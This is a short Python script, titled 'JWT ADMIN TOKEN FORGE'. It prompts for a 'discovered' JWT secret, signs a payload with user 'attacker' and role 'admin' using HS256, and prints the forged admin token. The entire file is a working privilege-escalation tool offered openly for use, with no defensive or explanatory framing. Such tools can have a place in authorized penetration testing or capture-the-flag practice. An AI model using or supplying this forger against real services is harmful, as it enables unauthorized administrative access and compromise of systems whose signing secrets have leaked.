import jwt
import time

print("=== JWT ADMIN TOKEN FORGE ===")

secret = input("Enter discovered JWT secret: ").strip()

payload = {
    "user": "attacker",
    "role": "admin",
    "exp": int(time.time()) + 1800
}

token = jwt.encode(payload, secret, algorithm="HS256")
print("\nForged ADMIN token:")
print(token)
